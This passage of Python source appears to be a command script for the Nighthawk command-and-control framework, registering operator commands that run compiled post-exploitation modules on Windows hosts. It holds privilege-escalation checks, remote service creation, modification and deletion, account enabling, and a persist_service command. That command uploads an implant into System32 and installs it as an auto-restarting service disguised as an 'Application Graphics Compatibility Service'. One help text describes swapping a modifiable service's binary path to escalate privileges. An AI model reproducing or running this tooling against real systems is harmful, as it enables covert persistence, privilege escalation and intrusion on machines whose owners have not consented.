    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("ModifiableAutorunCheck", "bin/PrivCheck/ModifiableAutorunCheck/ModifiableAutorunCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    modifiable_autorun_check,
    "modifiable_autorun_check",
    "BOF - Check for modifiable autorun executables. (avantguard script)",
    "BOF - Check for modifiable autorun executables. (avantguard script)",
    """modifiable_autorun_check
    Summary: Enumerates autorun registry keys and checks if the referenced executables are writable by the current user.

    Checked Locations:
    HKLM and HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKLM and HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM and HKCU:\SOFTWARE\Wow6432Node\...\Run (x64 systems)
    Usage: modifiable_autorun_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "modifiable_autorun_check"
)

def token_privileges_check(params, info):
    """
    Enumerate current token privileges.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("TokenPrivilegesCheck", "bin/PrivCheck/TokenPrivilegesCheck/TokenPrivilegesCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    token_privileges_check,
    "token_privileges_check",
    "BOF - Enumerate current token privileges. (avantguard script)",
    "BOF - Enumerate current token privileges. (avantguard script)",
    """token_privileges_check
    Summary: Enumerates all privileges for the current process token and shows their enabled/disabled status.
    Usage: token_privileges_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "token_privileges_check"
)

def unquoted_svc_path_check(params, info):
    """
    Check for Unquoted Service Paths vulnerability.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("UnquotedSVCPathCheck", "bin/PrivCheck/UnquotedSVCPathCheck/UnquotedSVCPathCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    unquoted_svc_path_check,
    "unquoted_svc_path_check",
    "BOF - Check for Unquoted Service Paths vulnerability. (avantguard script)",
    "BOF - Check for Unquoted Service Paths vulnerability. (avantguard script)",
    """unquoted_svc_path_check
    Summary: Enumerates Windows services and checks for unquoted paths 
    containing spaces. These can be exploited for privilege escalation.

    Vulnerability Conditions:
    - Service path contains spaces
    - Path is not enclosed in quotes
    - Path is not in System32/SysWOW64
    Usage: unquoted_svc_path_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "unquoted_svc_path_check"
)

def powershell_history_check(params, info):
    """
    Check for PowerShell history file.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("PowerShellHistoryCheck", "bin/PrivCheck/PowerShellHistoryCheck/PowerShellHistoryCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    powershell_history_check,
    "powershell_history_check",
    "BOF - Check for PowerShell history file. (avantguard script)",
    "BOF - Check for PowerShell history file. (avantguard script)",
    """powershell_history_check
    Summary: Checks if the PowerShell PSReadLine history file exists. 
    This file may contain sensitive commands, credentials, or secrets.

    File Location:
    %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    Usage: powershell_history_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "powershell_history_check"
)

def uac_status_check(params, info):
    """
    Check UAC status, integrity level, and admin membership.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("UACStatusCheck", "bin/PrivCheck/UACStatusCheck/UACStatusCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    uac_status_check,
    "uac_status_check",
    "BOF - Check UAC status, integrity level, and admin membership. (avantguard script)",
    "BOF - Check UAC status, integrity level, and admin membership. (avantguard script)",
    """uac_status_check
    Summary: Checks UAC registry settings, current process integrity level, 
    and local administrator group membership.

    Checks Performed:
    - EnableLUA (UAC enabled/disabled)
    - ConsentPromptBehaviorAdmin (UAC prompt level)
    - PromptOnSecureDesktop
    - Token Integrity Level
    - Local Administrators group membership
    Usage: uac_status_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "uac_status_check"
)

def modifiable_svc_check(params, info):
    """
    Check for services with modifiable permissions.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("ModifiableSVCCheck", "bin/PrivCheck/ModifiableSVCCheck/ModifiableSVCCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    modifiable_svc_check,
    "modifiable_svc_check",
    "BOF - Check for services with modifiable permissions. (avantguard script)",
    "BOF - Check for services with modifiable permissions. (avantguard script)",
    """modifiable_svc_check
    Summary: Enumerates all Windows services and checks their security
    descriptors to find services that the current user can modify.

    Checked Permissions:
    - SERVICE_CHANGE_CONFIG
    - WRITE_DAC
    - WRITE_OWNER
    - GENERIC_ALL
    - GENERIC_WRITE
    - SERVICE_ALL_ACCESS

    Exploitation:
    If a service is modifiable, you can change its binary path 
    to point to a malicious executable for privilege escalation.
    Usage: modifiable_svc_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "modifiable_svc_check"
)

def priv_check_all(params, info):
    """
    Perform all checks in the PrivCheck BOF collection.
    """
    nighthawk.console_write(CONSOLE_INFO, "executing all checks in PrivCheck BOF collection")

    if not always_install_elevated_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing AlwaysInstallElevated BOF")
        return False
    
    if not autologon_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing Autologon BOF")
        return False
    
    if not credential_manager_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing CredentialManagerCheck BOF")
        return False
    
    if not hijackable_path_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing HijackablePathCheck BOF")
        return False
        
    if not token_privileges_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing TokenPrivilegesCheck BOF")
        return False
        
    if not unquoted_svc_path_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing UnquotedSVCPathCheck BOF")
        return False
        
    if not powershell_history_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing PowerShellHistoryCheck BOF")
        return False

    if not uac_status_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing UACStatusCheck BOF")
        return False

    if not modifiable_svc_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, "Error executing ModifiableSVCCheck BOF")
        return False

    nighthawk.console_write(CONSOLE_INFO, "all PrivCheck checks executed successfully")
    return True

nighthawk.register_command(
    priv_check_all,
    "priv_check_all",
    "BOF - Perform all checks in the PrivCheck BOF collection. (avantguard script)",
    "BOF - Perform all checks in the PrivCheck BOF collection. (avantguard script)",
    """priv_check_all
    Summary: Performs all checks in the PrivCheck BOF collection.

    Executes all privilege escalation checks in sequence:
    - AlwaysInstallElevatedCheck
    - AutologonCheck
    - CredentialManagerCheck
    - HijackablePathCheck
    - ModifiableAutorunCheck
    - ModifiableSVCCheck
    - TokenPrivilegesCheck
    - UnquotedSVCPathCheck
    - PowerShellHistoryCheck
    - UACStatusCheck

    THIS IS AN AVANTGUARD SCRIPT""",
    "priv_check_all"
)
# endregion

# region sc_config

def sc_config(params, info):
    """
    This command configures an existing service on the target host.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 4:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>")
        return False

    hostname = ""
    servicename = command_params[0]
    binpath = command_params[1]
    errmode = command_params[2]
    startmode = command_params[3]
    if len(command_params) >= 5: hostname = command_params[4]

    packed_params = pack_params(f"z{hostname}", f"z{servicename}", f"z{binpath}", f"s{errmode}", f"s{startmode}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_config", "bin/Remote/sc_config/sc_config", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    sc_config,
    "sc_config",
    "BOF - This command configures an existing service on the target host. (avantguard script)",
    "BOF - This command configures an existing service on the target host. (avantguard script)",
    """sc_config
    Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to configure.
         BINPATH      Required. The binary path of the service to execute.
         ERRORMODE    Required. The error mode of the service. The valid 
                      options are:
                        0 - ignore errors
                        1 - normal logging
                        2 - log severe errors
                        3 - log critical errors
         STARTMODE    Required. The start mode for the service. The valid
                      options are:
                        2 - auto start
                        3 - on demand start
                        4 - disabled
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.

    THIS IS AN AVANTGUARD SCRIPT""",
    "sc_config"
)

# endregion

# region sc_create

def sc_create(params, info):
    """
    This command configures a new service on the target host.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 7:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>")
        return False

    hostname = ""
    servicename = command_params[0]
    displayname = command_params[1]
    binpath = command_params[2]
    description = command_params[3]
    errmode = int(command_params[4])
    startmode = int(command_params[5])
    svctype = 3
    if len(command_params) >= 7: svctype = command_params[6]
    if len(command_params) >= 8: hostname = command_params[7]

    packed_params = pack_params(f"z{hostname}", f"z{servicename}", f"z{binpath}", f"z{displayname}", f"z{description}" f"s{errmode}", f"s{startmode}", f"s{svctype}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_create", "bin/Remote/sc_create/sc_create", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    sc_create,
    "sc_create",
    "BOF - This command creates a service on the target host. (avantguard script)",
    "BOF - This command creates a service on the target host. (avantguard script)",
    """sc_create
    Summary: This command creates a service on the target host.
Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         DISPLAYNAME  Required. The display name of the service.
         BINPATH      Required. The binary path of the service to execute.
         DESCRIPTION  Required. The description of the service.
         ERRORMODE    Required. The error mode of the service. The valid 
                      options are:
                        0 - ignore errors
                        1 - nomral logging
                        2 - log severe errors
                        3 - log critical errors
         STARTMODE    Required. The start mode for the service. The valid
                      options are:
                        0 - Boot Start (Drivers only)
                        1 - On IoInitSystem (Driver only)
                        2 - auto start
                        3 - manual start
                        4 - disabled
         TYPE         Optional. The type of service to create. The valid
                      options are:
                      1 - SERVICE_KERNEL_DRIVER (Driver service)
                      2 - SERVICE_FILE_SYSTEM_DRIVER (File system driver service)
                      16 - SERVICE_WIN32_OWN_PROCESS (Service that runs in its own process) <-- Default
                      32 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
                      80 - SERVICE_USER_OWN_PROCESS
                      96 - SERVICE_USER_SHARE_PROCESS
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.

    THIS IS AN AVANTGUARD SCRIPT""",
    "sc_create"
)

# endregion

# region sc_delete

def sc_delete(params, info):
    """
     Deletes a service
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_delete <SVCNAME> <OPT:HOSTNAME>")
        return False

    hostname = ""
    servicename = command_params[0]
    if len(command_params) >= 2: hostname = command_params[1]

    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_delete", "bin/Remote/sc_delete/sc_delete", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    sc_delete,
    "sc_delete",
    "BOF - Deletes a service (avantguard script)",
    "BOF - Deletes a service (avantguard script)",
    """sc_delete
Summary: Deletes a service
Usage:   sc_delete <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to delete.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.

    THIS IS AN AVANTGUARD SCRIPT""",
    "sc_delete"
)

# endregion

# region sc_stop

def sc_stop(params, info):
    """
    This command stops the specified service on the target host.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_stop <SVCNAME> <OPT:HOSTNAME>")
        return False

    hostname = ""
    servicename = command_params[0]
    if len(command_params) >= 2: hostname = command_params[1]

    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_stop", "bin/Remote/sc_stop/sc_stop", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    sc_stop,
    "sc_stop",
    "BOF - This command stops the specified service on the target host. (avantguard script)",
    "BOF - This command stops the specified service on the target host. (avantguard script)",
    """sc_stop
Summary: This command stops the specified service on the target host.
Usage:   sc_stop <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to stop.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.

    THIS IS AN AVANTGUARD SCRIPT""",
    "sc_stop"
)

# endregion

# region sc_start

def sc_start(params, info):
    """
    This command starts the specified service on the target host.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_start <SVCNAME> <OPT:HOSTNAME>")
        return False

    hostname = ""
    servicename = command_params[0]
    if len(command_params) >= 2: hostname = command_params[1]

    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_start", "bin/Remote/sc_start/sc_start", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    sc_start,
    "sc_start",
    "BOF - Start a service (avantguard script)",
    "BOF - Start a service (avantguard script)",
    """sc_start
Summary: This command starts the specified service on the target host.
Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to start.
         HOSTNAME Optional. The host to connect to and run the command on. The
                  local system is targeted if a HOSTNAME is not specified.

    THIS IS AN AVANTGUARD SCRIPT""",
    "sc_start"
)

# endregion

# region enableuser

def enableuser(params, info):
    """
    Activates (and if necessary enables) the specified user account on the target computer. 
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: enableuser <USERNAME> <OPT:DOMAIN>")
        return False

    domain = ""
    username = command_params[0]
    if len(command_params) >= 2: domain = command_params[1]

    packed_params = pack_params(f"z{domain}", f"z{username}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("enableuser", "bin/Remote/enableuser/enableuser", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    enableuser,
    "enableuser",
    "BOF - Enables and unlocks the specified user account (avantguard script)",
    "BOF - Enables and unlocks the specified user account (avantguard script)",
    """enableuser
Summary: Activates (and if necessary enables) the specified user account on the
         target computer. 
Usage:   enableuser <USERNAME> <OPT:DOMAIN>
         USERNAME  Required. The user name to activate/enable. 
         DOMAIN    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   only username to target an account on the local machine.

    THIS IS AN AVANTGUARD SCRIPT""",
    "enableuser"
)

# endregion

# region persist_service

def persist_service(params, info):
    """
    Create persistence as windows service
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) > 0:
        svcbinary = command_params[0]
        nighthawk.console_write(CONSOLE_INFO, "upload service binary to \"C:\\Windows\\System32\\agcssvc.exe\"")
        api.upload(svcbinary, "C:\\Windows\\System32\\agcssvc.exe")
        time.sleep(30)

    domain = ""
    username = command_params[0]
    if len(command_params) >= 2: domain = command_params[1]

    packed_params = pack_params(
        "z",
        "zagcssvc",
        "zC:\\Windows\\System32\\agcssvc.exe",
        "zApplication Graphics Compatibility Service",
        "zEnables enhanced compatibility and rendering for legacy applications using AGC graphics components.",
        f"s{0}",
        f"s{2}",
        f"s{16}"
        )
    if type(packed_params) != bytes:
        return False
        
    nighthawk.console_write(CONSOLE_INFO, "registering new windows service \"agcssvc\" with sc_create BOF")
    base_execute_bof("sc_create", "bin/Remote/sc_create/sc_create", save_to_file, output_to_console, open_in_notepad, packed_params, info)

    nighthawk.console_write(CONSOLE_INFO, "configure auto restart on failure for windows service \"agcssvc\" with sc_failure BOF")
    packed_params = pack_params("z", "zagcssvc", f"i{3}", "z", "z", f"s{3}", "z1/1/1/1/1/1")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_failure", "bin/Remote/sc_failure/sc_failure", save_to_file, output_to_console, open_in_notepad, packed_params, info)

    nighthawk.console_write(CONSOLE_INFO, "start windows service \"agcssvc\" with sc_start BOF")
    packed_params = pack_params("z", "zagcssvc")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("sc_start", "bin/Remote/sc_start/sc_start", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    persist_service,
    "persist_service",
    "BOF - Create persistence as windows service (avantguard script)",
    "BOF - Create persistence as windows service (avantguard script)",
    """persist_service
Summary: Create persistence as windows service.
Usage:   persist_service <SERVICE_BINARY_ON_ATTACKER_COMPUTER>
         please user a service binary created by the NHLoader. Normal binaries will stop working after some seconds because they don't register as a windows service.
         This command will upload the binary and create the following windows service:
         servicename: agcssvc
         binary: C:\\Windows\\System32\\agcssvc.exe
         displayname: Application Graphics Compatibility Service
         description: Enables enhanced compatibility and rendering for legacy applications using AGC graphics components.

Example: persist_service C:\\Payload\\agent-svc.exe
    THIS IS AN AVANTGUARD SCRIPT""",
    "persist_service"
)

# endregion